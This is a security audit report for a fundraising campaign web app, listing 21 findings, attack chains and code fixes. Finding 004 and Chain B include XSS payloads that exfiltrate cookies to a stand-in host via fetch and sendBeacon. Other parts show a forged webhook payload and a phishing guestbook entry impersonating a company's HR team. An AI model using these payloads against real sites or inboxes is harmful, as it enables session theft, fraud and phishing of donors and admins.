# Security Audit Report — Temitope Fundraising Campaign
**Auditor:** Senior Red-Team Security Review  
**Date:** July 2026  
**Scope:** Full codebase — frontend, backend APIs, auth, database, infrastructure, third-party integrations

---

## 1. Vulnerability Summary

| Severity | Count |
|----------|-------|
| Critical | 3 |
| High     | 6 |
| Medium   | 7 |
| Low      | 5 |
| **Total**| **21** |

---

## 2. Detailed Findings

---

### FINDING 001 — Rate Limiting Completely Non-Functional on Vercel
**Severity:** Critical  
**Affected Component:** `src/lib/rate-limit.ts`, all POST API routes  

**Description:**  
The rate limiter uses an in-memory JavaScript `Map` stored in module scope. On Vercel, every API route runs as an independent serverless function. Each cold start (which happens after ~30–60 seconds of inactivity) creates a completely fresh `Map` with zero entries. The rate limit counter never accumulates across invocations. This means every route that depends on rate limiting — admin login, donations, guestbook submissions, career support — has **effectively zero rate limiting** in production.

**Exploitation Scenario:**  
1. Attacker targets `/api/admin/login`
2. Sends 5 login attempts — rate limit fires, returns 429
3. Waits 60 seconds (cold start resets)
4. Sends 5 more attempts — rate limit is reset, all 5 allowed again
5. Repeats indefinitely with no throttling
6. With a weak or common admin password: bruteforce succeeds

**Impact:**  
- Admin account can be brute-forced without restriction  
- Donation endpoint can be spammed to create thousands of fake pending records  
- Guestbook can be flooded with spam  
- Campaign stats database polluted  

**Fix:**  
Replace in-memory store with Upstash Redis (free tier available, designed for serverless):

```bash
npm install @upstash/redis @upstash/ratelimit
```

```ts
// src/lib/rate-limit.ts
import { Ratelimit } from "@upstash/ratelimit";
import { Redis } from "@upstash/redis";

const redis = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL!,
  token: process.env.UPSTASH_REDIS_REST_TOKEN!,
});

const limiters: Record<string, Ratelimit> = {};

export async function rateLimit(
  key: string,
  limit = 5,
  windowSec = 60
): Promise<{ allowed: boolean }> {
  const id = `${limit}:${windowSec}`;
  if (!limiters[id]) {
    limiters[id] = new Ratelimit({
      redis,
      limiter: Ratelimit.slidingWindow(limit, `${windowSec}s`),
    });
  }
  const { success } = await limiters[id].limit(key);
  return { allowed: success };
}
```

---

### FINDING 002 — Double-Payment Race Condition (Campaign Stats Inflation)
**Severity:** Critical  
**Affected Component:** `src/app/api/webhook/route.ts`, `src/app/api/donations/verify/route.ts`  

**Description:**  
Two separate endpoints can both process the same completed payment simultaneously:

- **`/api/webhook`** — called by Flutterwave's server when payment completes  
- **`/api/donations/verify`** — called when the donor's browser returns to the success page

Both use a non-atomic read-check-write pattern:
1. Read: `SELECT status FROM donations WHERE tx_ref = ?`  
2. Check: `if (status === 'successful') return early`  
3. Write: `UPDATE donations SET status = 'successful'`  
4. Write: `increment_campaign_stats(amount)`

If both requests execute between steps 1 and 3 of each other, both see `status = 'pending'`, both update to `'successful'`, and both call `increment_campaign_stats`. The result is `amount_raised` inflated by 2× for a single payment.

**Exploitation Scenario:**  
1. Donor completes payment
2. Flutterwave fires webhook (server-to-server) — starts processing
3. Simultaneously, donor's browser hits success page which calls `/api/donations/verify`
4. Both read `status = 'pending'` before either writes
5. Both increment campaign stats
6. A ₦5,000 donation shows as ₦10,000 raised
7. Attacker could deliberately time this by submitting payment and immediately hitting `/api/donations/verify` with a valid `tx_ref`

**Impact:**  
- Campaign total inflated, misleading donors  
- Double email notifications to admin  
- Financial reporting inaccurate  

**Fix:**  
Use PostgreSQL's atomic `UPDATE ... WHERE status = 'pending' RETURNING *` pattern — only proceed if the row was actually updated:

```sql
-- In webhook handler, replace the two-step check with:
UPDATE donations
SET status = 'successful', flw_transaction_id = $1
WHERE transaction_reference = $2 AND status = 'pending'
RETURNING *;
-- If 0 rows returned: already processed, skip stats increment
```

In Supabase:
```ts
const { data: updated } = await supabase
  .from("donations")
  .update({ status: "successful", flw_transaction_id: String(flw_id) })
  .eq("transaction_reference", tx_ref)
  .eq("status", "pending")  // ← atomic guard
  .select()
  .single();

if (!updated) {
  // Already processed by the other handler
  return NextResponse.json({ received: true });
}
// Only reaches here if THIS handler won the race
await supabase.rpc("increment_campaign_stats", { p_amount: amount });
```

Apply this same fix to `/api/donations/verify/route.ts`.

---

### FINDING 003 — Token Timestamp NaN Bypass (Never-Expiring Admin Tokens)
**Severity:** Critical  
**Affected Component:** `src/lib/auth.ts` — `verifyAdminToken()`  

**Description:**  
The admin token format is `base64("admin:TIMESTAMP:HEXSIG")`. The expiry check is:

```ts
if (Date.now() - parseInt(ts) > 8 * 60 * 60 * 1000) return false;
```

In JavaScript, `parseInt("")` returns `NaN`. `NaN > 28800000` evaluates to `false`, meaning the check **silently passes** and the token is treated as non-expired. If an attacker can craft a token with an empty or non-numeric timestamp field and a valid HMAC signature — or if the token store somehow produces such a token — it would never expire.

More practically: the `split(":")` on the decoded string splits on every colon. The hex HMAC signature cannot contain colons, and the timestamp is `Date.now()` (always numeric). However, the `parts.length !== 3` check only catches exactly-3-part splits. A payload like `admin::HEXSIG` (empty timestamp) would produce 3 parts with `ts = ""`, `parseInt("") = NaN`, and the age check silently passes.

**Impact:**  
- If an attacker ever obtains a malformed token (e.g., via log exposure or crafting), it could be used forever  
- Token invalidation is impossible — there is no server-side token store, so compromised tokens cannot be revoked  

**Fix:**  
```ts
const tsNum = parseInt(ts, 10);
if (isNaN(tsNum)) return false;  // ← explicit NaN guard
if (Date.now() - tsNum > 8 * 60 * 60 * 1000) return false;
```

Also: store issued token IDs in Redis with TTL to enable revocation.

---

### FINDING 004 — HTML Injection / XSS in Admin Email Templates
**Severity:** High  
**Affected Component:** `src/lib/email.ts` — `notifyAdmin()`  

**Description:**  
The admin notification email is constructed by interpolating donor-controlled data directly into an HTML string:

```ts
`<p><strong>Twitter:</strong> ${data.twitter || "—"}</p>`
`<p><strong>LinkedIn:</strong> ${data.linkedin || "—"}</p>`
`<p><strong>Discord:</strong> ${data.discord || "—"}</p>`
```

None of these values are HTML-escaped before interpolation. A donor submitting:
```
twitter: <img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">
```
...will have that exact markup rendered inside your HTML email. Depending on the email client (Outlook, Apple Mail in some configs, Thunderbird), this can execute JavaScript or load external resources.

**Exploitation Scenario:**  
1. Attacker submits donation with `twitter = "<script src='https://evil.com/steal.js'></script>"`
2. Donation initiates successfully (passes Zod validation — no HTML restriction)
3. Payment completes, webhook fires, `notifyAdmin()` is called
4. Admin receives email with injected script tag in message body
5. If admin's email client renders HTML (most do), script executes in email context
6. Can steal cookies, session data, or display convincing phishing UI inside email

**Impact:**  
- Admin email client compromised  
- Potential credential theft  
- Convincing phishing within a trusted email  

**Fix:**  
```ts
function escapeHtml(str: string): string {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// Then in template:
`<p><strong>Twitter:</strong> ${escapeHtml(data.twitter || "—")}</p>`
```

---

### FINDING 005 — Webhook Amount Trusted From Payload, Not Database
**Severity:** High  
**Affected Component:** `src/app/api/webhook/route.ts`  

**Description:**  
The webhook handler extracts `amount` directly from Flutterwave's webhook payload and passes it to `increment_campaign_stats`:

```ts
const { status, tx_ref, id: flw_id, amount, customer } = payload.data ?? {};
// ...
await supabase.rpc("increment_campaign_stats", { p_amount: amount });
```

The `amount` is never cross-checked against the amount stored in the `donations` table when the donation was initiated. If Flutterwave's webhook is spoofed (unlikely but possible if the hash secret is weak or leaked) or if there is a bug in Flutterwave's system sending incorrect amounts, the campaign stats will reflect the payload amount, not the actual charged amount.

**Fix:**  
Always use the amount from your own database, not the payment provider's webhook:

```ts
// After fetching donation record from DB:
const { data: donation } = await supabase
  .from("donations")
  .update({ status: "successful", flw_transaction_id: String(flw_id) })
  .eq("transaction_reference", tx_ref)
  .eq("status", "pending")
  .select()
  .single();

// Use donation.amount (from YOUR DB), not amount (from THEIR payload)
await supabase.rpc("increment_campaign_stats", { p_amount: donation.amount });
```

---

### FINDING 006 — Dual Authentication Systems — Broken Admin Career Support Route
**Severity:** High  
**Affected Component:** `src/app/api/admin/career-support/route.ts`  

**Description:**  
Two completely different authentication libraries exist in the codebase:

- `src/lib/auth.ts` — sets cookie named `admin_token`, uses Node.js `crypto`
- `src/lib/admin-auth.ts` — checks cookie named `admin_session`, uses Web Crypto API

The admin login route (`/api/admin/login`) calls `signAdminToken()` from `src/lib/auth.ts`, which sets the `admin_token` cookie.

However, `/api/admin/career-support/route.ts` imports `isAdminAuthenticated` from `src/lib/admin-auth.ts`, which checks for the `admin_session` cookie — a cookie that is **never set by anything in the codebase**.

**Result:** The career support submissions endpoint always returns 401 Unauthorized for any logged-in admin. The admin dashboard's Submissions tab never loads data.

**Exploitation Scenario (Business Logic):**  
- Attacker knows about this route inconsistency  
- Admin is frustrated that career submissions never load  
- Admin disables authentication check to "fix" it  
- Route becomes publicly accessible  

**Fix:**  
Delete `src/lib/admin-auth.ts`. Update `src/app/api/admin/career-support/route.ts` to import from `src/lib/auth.ts`:

```ts
import { isAdminAuthenticated } from "@/lib/auth";

export async function GET(req: NextRequest) {
  if (!isAdminAuthenticated(req)) return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  // ...
}
```

---

### FINDING 007 — No Content Security Policy (CSP)
**Severity:** High  
**Affected Component:** `next.config.ts`  

**Description:**  
The application sets `X-Frame-Options`, `X-Content-Type-Options`, and `X-XSS-Protection` but has **no Content-Security-Policy header**. Without CSP, any XSS vulnerability (present or future) can load arbitrary external scripts, exfiltrate data, or hijack the page. The application also loads Google Fonts from `fonts.googleapis.com` — a legitimate external source — which should be whitelisted in a proper CSP.

**Fix:**  
Add to `next.config.ts`:
```ts
{
  key: "Content-Security-Policy",
  value: [
    "default-src 'self'",
    "script-src 'self' 'unsafe-inline'",  // tighten to nonce-based in future
    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
    "font-src 'self' https://fonts.gstatic.com",
    "img-src 'self' data: https://avatars.githubusercontent.com",
    "connect-src 'self' https://*.supabase.co https://api.flutterwave.com",
    "frame-ancestors 'none'",
  ].join("; "),
},
{
  key: "Strict-Transport-Security",
  value: "max-age=63072000; includeSubDomains; preload",
},
{
  key: "Referrer-Policy",
  value: "strict-origin-when-cross-origin",
},
```

---

### FINDING 008 — Admin Stats PATCH Has No Input Validation
**Severity:** High  
**Affected Component:** `src/app/api/admin/stats/route.ts`  

**Description:**  
The PATCH endpoint for updating campaign stats accepts `body.amount_raised` and `body.donor_count` with zero validation:

```ts
const body = await req.json();
const supabase = createAdminClient();
await supabase
  .from("campaign_stats")
  .update({ amount_raised: body.amount_raised, donor_count: body.donor_count })
  .eq("id", body.id)
```

An authenticated admin (or anyone who compromises the admin session) can set:
- `amount_raised: 350000` — fake the goal as reached
- `amount_raised: -999999` — show campaign massively in debt
- `amount_raised: 99999999` — inflate beyond any realistic number
- `donor_count: 0` — erase donor history display
- `id: <arbitrary_uuid>` — target any row in the table

**Fix:**  
```ts
const body = await req.json();
const parsed = z.object({
  id: z.string().uuid(),
  amount_raised: z.number().int().min(0).max(10_000_000),
  donor_count: z.number().int().min(0).max(100_000),
}).safeParse(body);
if (!parsed.success) return NextResponse.json({ error: "Invalid input" }, { status: 400 });
```

---

### FINDING 009 — Admin Password Transmitted in Plaintext JSON Body
**Severity:** Medium  
**Affected Component:** `src/app/admin/page.tsx`, `src/app/api/admin/login/route.ts`  

**Description:**  
The admin password is sent as `{ "password": "..." }` in a JSON request body over HTTPS. While HTTPS protects it in transit, the password is visible in:
- Browser developer tools Network tab (anyone with physical access to your device)
- Server access logs if logging middleware captures request bodies
- Any man-in-the-middle if HTTPS certificate validation fails
- Vercel function logs if the route accidentally logs the body

There is no logout mechanism — no endpoint to invalidate the `admin_token` cookie, and no client-side clear button.

**Fix:**  
- Add a logout endpoint that clears the cookie:
```ts
// /api/admin/logout/route.ts
export async function POST() {
  const res = NextResponse.json({ success: true });
  res.cookies.delete("admin_token");
  return res;
}
```
- Add a logout button to the admin dashboard  
- Never log `req.body` in auth routes  

---

### FINDING 010 — LinkedIn/URL Fields Accept Any URL (Phishing & Open Redirect)
**Severity:** Medium  
**Affected Component:** `src/lib/validation.ts`, `src/lib/email.ts`  

**Description:**  
The `linkedin_url` field in `careerSupportSchema` and `linkedin` in `donationSchema` both use `z.string().url()` which accepts **any valid URL** — not just `linkedin.com`. The URL is stored in the database and displayed in admin emails as a clickable link.

Attacker can submit:
```
linkedin_url: "https://evil.com/phishing-page-pretending-to-be-linkedin"
linkedin_url: "javascript:alert(document.cookie)"  // browsers block, but still stored
```

The admin email shows these as plain text in `<p>` tags. If rendered as `<a href="...">` in future, clicking takes admin to attacker-controlled page.

**Fix:**  
```ts
linkedin: z.string().url()
  .refine(url => {
    try {
      const u = new URL(url);
      return ['linkedin.com', 'www.linkedin.com'].includes(u.hostname);
    } catch { return false; }
  }, "Must be a LinkedIn URL")
  .optional()
  .or(z.literal(""))
```

---

### FINDING 011 — Webhook Has No Rate Limiting
**Severity:** Medium  
**Affected Component:** `src/app/api/webhook/route.ts`  

**Description:**  
The webhook endpoint has no rate limiting. While it verifies the `verif-hash` signature, an attacker who brute-forces or leaks the hash can flood the endpoint with fake successful payment notifications, potentially causing:
- Database write pressure
- Email notification flooding to admin and donors
- Campaign stats manipulation if the hash is known

Even without knowing the hash, thousands of signature-failing requests still hit the function, incurring Vercel compute costs.

**Fix:**  
Add IP-based rate limiting (or use Upstash once fixing Finding 001) and return 429 after repeated failures from the same IP. Also add idempotency: check if `flw_transaction_id` already exists before processing.

---

### FINDING 012 — Donations Verify Endpoint Trusts Client-Supplied `status` Field
**Severity:** Medium  
**Affected Component:** `src/app/api/donations/verify/route.ts`  

**Description:**  
The verify endpoint accepts `status` from the client request body:

```ts
const { transaction_id, tx_ref, status } = parsed.data;
if (status !== 'successful') {
  return NextResponse.json({ success: false, error: 'Payment was not successful' }, { status: 400 });
}
```

While it does verify with Flutterwave's API next, the initial early-return check trusts the client-supplied status. More importantly, the `status` field from the Flutterwave redirect URL in the browser is `?status=completed` (as seen in the actual redirect) not `successful`. This is a different string — which means the verify endpoint would reject legitimate completed payments from Flutterwave's redirect.

**Fix:**  
Remove the client-supplied `status` check entirely. Only trust Flutterwave's verification API response:
```ts
// Don't trust status from client at all
// Just verify with FLW API and trust that result
const { transaction_id, tx_ref } = parsed.data;
// Then verify with FLW API...
if (txData.status !== 'successful') { ... }
```

---

### FINDING 013 — Non-Atomic Campaign Stats Update in Verify Route
**Severity:** Medium  
**Affected Component:** `src/app/api/donations/verify/route.ts`  

**Description:**  
Unlike the webhook which uses the atomic `increment_campaign_stats` RPC function, the verify route does a manual read-modify-write:

```ts
const { data: stats } = await supabase.from('campaign_stats').select('*').single();
await supabase.from('campaign_stats').update({
  amount_raised: Number(stats.amount_raised) + Number(txData.amount),
  donor_count: stats.donor_count + 1,
}).eq('id', stats.id);
```

Under concurrent load (multiple donors completing simultaneously), this pattern loses updates.

**Fix:**  
Use the same `increment_campaign_stats` RPC as the webhook:
```ts
await supabase.rpc("increment_campaign_stats", { p_amount: donation.amount });
```

---

### FINDING 014 — Admin Session Cookie Uses SameSite=Strict But No CSRF Protection on State-Changing Routes
**Severity:** Medium  
**Affected Component:** All admin API routes  

**Description:**  
`SameSite=Strict` provides good CSRF protection in modern browsers. However there is no explicit CSRF token, no `Origin` header verification, and no `Referer` check. In older browsers or non-standard clients, the SameSite protection may not apply. The admin endpoints also accept requests from any origin since no CORS restriction is set for admin routes specifically.

**Fix:**  
For defense in depth, add an `Origin` header check on state-changing admin routes:
```ts
const origin = req.headers.get("origin");
const allowed = process.env.NEXT_PUBLIC_SITE_URL;
if (!origin || !origin.startsWith(allowed ?? "")) {
  return NextResponse.json({ error: "Forbidden" }, { status: 403 });
}
```

---

### FINDING 015 — Fallback Default Secret in Auth Module
**Severity:** Medium  
**Affected Component:** `src/lib/auth.ts`  

**Description:**  
```ts
const sig = createHmac("sha256", process.env.ADMIN_JWT_SECRET ?? "dev-secret")
```

If `ADMIN_JWT_SECRET` is not set in the deployment environment, the application falls back to the hardcoded string `"dev-secret"`. This means:
- Tokens signed with `"dev-secret"` are valid
- An attacker who knows this fallback (it's in the public source code) can forge admin tokens if the env var is unset
- Vercel cold starts with missing env vars would silently fall back

**Fix:**  
Throw an error at startup rather than falling back:
```ts
const secret = process.env.ADMIN_JWT_SECRET;
if (!secret) throw new Error("ADMIN_JWT_SECRET environment variable is required");
```

---

### FINDING 016 — No HTTPS Redirect or HSTS Header
**Severity:** Medium  
**Affected Component:** `next.config.ts`  

**Description:**  
There is no `Strict-Transport-Security` header. On first HTTP visit (before any HTTPS redirect) an attacker on the same network can intercept traffic (coffee shop, hotel WiFi). While Vercel forces HTTPS, the missing HSTS header means the browser won't enforce HTTPS on repeat visits without server instruction.

**Fix:**  
Add to `next.config.ts` headers (as noted in Finding 007):
```
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```

---

### FINDING 017 — Admin Endpoint Structure Publicly Discoverable
**Severity:** Low  
**Affected Component:** `/api/admin/*` routes  

**Description:**  
All admin API endpoints follow a predictable pattern and are deployed at well-known paths. An attacker can enumerate `/api/admin/login`, `/api/admin/export`, `/api/admin/donations` etc. by guessing or reading the public source code if the repository is public.

**Impact:** Low — all endpoints require valid session cookie. But knowing the structure helps attackers target specific endpoints.

**Fix:**  
Make the repo private, or add a non-obvious prefix: `/api/mgmt/` or `/api/private/`. Not a strong defense but raises the bar.

---

### FINDING 018 — Guestbook Spam Without Authentication
**Severity:** Low  
**Affected Component:** `src/app/api/guestbook/route.ts`  

**Description:**  
Anyone can POST to the guestbook with no friction. While entries require admin approval before appearing publicly, a spammer can flood the admin's approval queue with thousands of entries, making legitimate messages difficult to find and consuming admin time.

With the rate limiter broken (Finding 001), this is effectively unlimited.

**Fix:**  
Once rate limiting is fixed (Finding 001), also consider adding honeypot fields or a simple proof-of-work challenge.

---

### FINDING 019 — Missing Logout Functionality
**Severity:** Low  
**Affected Component:** `src/app/admin/page.tsx`  

**Description:**  
There is no logout button or session termination mechanism in the admin dashboard. The `admin_token` cookie has an 8-hour maxAge but cannot be invalidated early. If an admin uses a shared computer, a public library, or their device is stolen, the session remains valid for up to 8 hours with no way to revoke it.

**Fix:**  
Add a `POST /api/admin/logout` route that clears the cookie, and a logout button in the dashboard header.

---

### FINDING 020 — Webhook Endpoint Returns 500 on DB Error, Causing Flutterwave Retries
**Severity:** Low  
**Affected Component:** `src/app/api/webhook/route.ts`  

**Description:**  
When the database update fails, the webhook returns HTTP 500. Flutterwave interprets non-200 responses as failures and **retries the webhook multiple times**. If the DB is intermittently unavailable, this retry storm can cause multiple attempts to increment campaign stats when the DB comes back online — combining with the race condition in Finding 002 to cause stats inflation.

**Fix:**  
Once the idempotency fix from Finding 002 is in place, a retry becomes safe. Additionally return 200 with a processed flag even on minor DB errors, and handle reconciliation separately.

---

### FINDING 021 — `console.error` Leaks Internal DB Errors to Vercel Logs
**Severity:** Low  
**Affected Component:** Multiple API routes  

**Description:**  
```ts
console.error("DB error:", dbError);
console.error("Flutterwave error:", err);
```

Vercel function logs are accessible to anyone with Vercel dashboard access. If `dbError` contains table names, column names, or Supabase internals, this information aids an attacker who gains access to your Vercel account. Additionally, if error messages are ever inadvertently returned to clients, they reveal schema details.

**Fix:**  
Use a structured logger that scrubs sensitive fields, or at minimum ensure error objects are not fully serialized to logs:
```ts
console.error("DB error code:", dbError?.code);  // not the full object
```

---

## 3. Attack Chains

### Chain A — Full Admin Takeover via Broken Rate Limit + Weak Password

```
Finding 001 (Rate limiter ineffective on Vercel)
        +
Weak admin password (e.g., "temi2026!")
        ↓
Attacker scripts 5 login attempts, waits 60 seconds, repeats
No actual throttling occurs — each serverless cold start resets counter
        ↓
Password brute-forced in hours/days depending on complexity
        ↓
Admin session cookie obtained
        ↓
Full access: donor PII exported (Finding 008), stats manipulated,
guestbook moderated, campaign updates posted with false information
        ↓
Attacker posts fake "Goal Reached — No More Donations Needed" update
        ↓
Campaign poisoned — donors stop contributing
```

**Severity: Critical**. Eliminate by fixing Finding 001 first, then ensure password is 16+ random characters.

---

### Chain B — Email XSS → Admin Session Hijack

```
Finding 004 (HTML injection in admin email)
        ↓
Attacker submits donation with:
twitter = "<img src=x onerror='navigator.sendBeacon(\"https://evil.com/\"+document.cookie)'>"
        ↓
Donation initiates, payment completes (can use real ₦100 minimum)
        ↓
notifyAdmin() sends HTML email with injected payload to admin's inbox
        ↓
Admin opens email in client that renders HTML (Outlook, Apple Mail)
        ↓
Injected script fires, exfiltrates admin cookies/credentials
        ↓
Attacker gains admin session → full dashboard access
```

**Severity: High**. Fix by HTML-escaping all donor-supplied fields in email templates.

---

### Chain C — Stats Inflation via Double-Spend + Webhook Replay

```
Finding 002 (Race condition — dual processing paths)
        +
Finding 011 (No webhook rate limiting)
        +
Finding 005 (Amount trusted from webhook payload)
        ↓
Step 1: Attacker makes a legitimate ₦100 donation, gets tx_ref
Step 2: Immediately after payment, attacker calls /api/donations/verify
        with the tx_ref and transaction_id
Step 3: Simultaneously Flutterwave fires the webhook
Step 4: Both handlers read status='pending', both update to 'successful'
Step 5: increment_campaign_stats called twice → ₦200 added for ₦100 payment
        ↓
With Finding 011 (no webhook rate limit) + leaked secret hash:
Attacker replays same webhook with inflated amount:
{ "data": { "amount": 349900, "tx_ref": "TEMI-...", "status": "successful" }}
        ↓
Campaign shows ₦350,000 raised (goal reached!) from a ₦100 donation
        ↓
Supporters stop donating, believing goal is met
        ↓
Real campaign fails to reach actual goal
```

**Severity: Critical chain**. Fix Findings 002, 005, and 011 together.

---

### Chain D — Phishing Campaign via URL Field + Public Guestbook

```
Finding 010 (LinkedIn field accepts any URL)
        +
Finding 018 (Guestbook spam with broken rate limit)
        ↓
Attacker submits guestbook entries:
name = "Anthropic HR Team"
message = "We're hiring data engineers! Apply at: https://anthropic-jobs.evil.com"
social_handle = "@anthropic"
        ↓
With broken rate limit (Finding 001), attacker submits hundreds of entries
        ↓
Admin approves some entries (time pressure, volume of legitimate submissions)
        ↓
Visitors see convincing fake job offers on Temitope's campaign page
        ↓
Victims enter credentials on phishing site
        ↓
Reputation damage to campaign even if phishing is detected
```

**Severity: Medium**. Fix rate limiting first, add content moderation hints to admin UI.

---

## 4. Secure Design Recommendations

### 1. Replace In-Memory Rate Limiting Immediately (P0)
This is the most urgent fix. Everything downstream depends on it. Use Upstash Redis which has a generous free tier and is purpose-built for serverless rate limiting on Vercel.

### 2. Consolidate to One Auth System
Delete `src/lib/admin-auth.ts`. Standardize all admin routes on `src/lib/auth.ts`. The dual system causes silent failures and is impossible to reason about correctly.

### 3. Make the Webhook Handler Fully Idempotent
The webhook should be safe to call multiple times with the same payload. Use the atomic `UPDATE ... WHERE status = 'pending'` pattern. Log idempotency hits for monitoring.

### 4. Never Trust Amounts from Payment Providers in Webhook Payloads
Always verify: use your own DB record's amount after confirming the tx_ref matches. Use Flutterwave's verification API (`/v3/transactions/{id}/verify`) rather than trusting the webhook payload amount.

### 5. HTML-Escape All User Data Before Embedding in Email Templates
Create a single `escapeHtml()` utility and use it on every user-supplied field before interpolating into email HTML. Treat the admin email as an attack surface.

### 6. Add a Content Security Policy
Even a basic CSP dramatically limits the damage from any XSS. Start with `report-only` mode to discover issues without breaking anything, then enforce.

### 7. Add Validation to Admin Stats PATCH
The admin dashboard should only allow values within realistic bounds. Use Zod on all admin endpoints, not just public ones.

### 8. Add Startup Validation for Required Environment Variables
```ts
// src/lib/env.ts
const required = [
  'SUPABASE_SERVICE_ROLE_KEY',
  'ADMIN_JWT_SECRET',
  'ADMIN_PASSWORD',
  'FLUTTERWAVE_SECRET_KEY',
  'FLUTTERWAVE_SECRET_HASH',
];

for (const key of required) {
  if (!process.env[key]) {
    throw new Error(`Missing required environment variable: ${key}`);
  }
}
```

### 9. Add a Logout Route and Token Revocation
Store issued token IDs in Redis (cheaply — just the token ID + expiry). On logout, add the token ID to a Redis revocation set. Check this set in `isAdminAuthenticated()`.

### 10. Add Monitoring and Alerting
Hook into Vercel's logging or add a lightweight logging service (e.g., Axiom, which has a free Vercel integration). Alert on:
- More than 3 failed admin login attempts in 10 minutes
- Webhook processing errors
- Database errors
- Campaign stats changing by more than 10% in under a minute

### 11. Restrict LinkedIn/Social URLs to Known Safe Domains
The submission forms should validate that URLs belong to expected domains (`linkedin.com`, `github.com`, `twitter.com`, `discord.gg`). Store anything else as plain text, not as a URL.

### 12. Add `SameSite=Lax` Consideration
`SameSite=Strict` on the admin cookie means it won't be sent on links clicked from external sites (e.g., clicking a link from your email to the admin page). Consider `SameSite=Lax` for better usability with the same CSRF protection for state-changing requests.

---

## Priority Fix Order

| Priority | Finding | Effort | Impact |
|----------|---------|--------|--------|
| 1 | FINDING 001 — Rate Limiting | Medium | Eliminates brute force |
| 2 | FINDING 002 — Double-Spend Race | Low | Protects financial integrity |
| 3 | FINDING 004 — Email HTML Injection | Low | Stops email XSS chain |
| 4 | FINDING 003 — NaN Token Bypass | Low | Closes token edge case |
| 5 | FINDING 006 — Dual Auth Systems | Low | Fixes broken admin feature |
| 6 | FINDING 007 — No CSP | Medium | Hardens against XSS class |
| 7 | FINDING 005 — Webhook Amount Trust | Low | Closes inflation vector |
| 8 | FINDING 015 — Fallback Secret | Trivial | Prevents misconfiguration |
| 9 | FINDING 008 — Stats Validation | Low | Prevents data corruption |
| 10 | FINDING 019 — No Logout | Low | Basic session hygiene |

---

*This audit reflects the codebase as reviewed. Fixes should be retested after implementation. A follow-up audit is recommended after the critical findings are resolved.*
